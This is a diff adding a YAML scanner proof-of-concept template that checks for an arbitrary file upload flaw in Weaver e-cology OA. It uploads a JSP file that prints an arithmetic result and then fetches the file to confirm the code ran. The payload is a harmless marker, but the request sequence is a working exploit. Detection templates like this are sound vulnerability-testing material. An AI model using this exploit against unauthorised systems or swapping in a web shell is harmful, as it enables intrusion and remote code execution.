@@ -1,0 +1,30 @@
+id: poc-yaml-weaver-ecology-oa-uploadoperation-arbitrary-file-upload
+info:
+  name: 泛微OA Ecology OA uploadOperation.jsp 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: e-cology
+  osprey-id: vb_2021_0023
+variables:
+  r_rand_name: random_str(5)
+requests:
+- method: POST
+  path: /page/exportImport/uploadOperation.jsp
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+      like Gecko) Chrome/89.0.4389.90 Safari/537.36
+    Connection: close
+    Content-Length: '500'
+  files:
+    file:
+      content_type: application/octet-stream
+      filename: '{{.r_rand_name}}.jsp'
+      content: <%out.print(123456789+12321424);%>
+  expression: 'status_code == 200
+
+    '
+- method: GET
+  path: /page/exportImport/fileTransfer/{{.r_rand_name}}.jsp
+  expression: contains(body, "135778213")
+transport: http
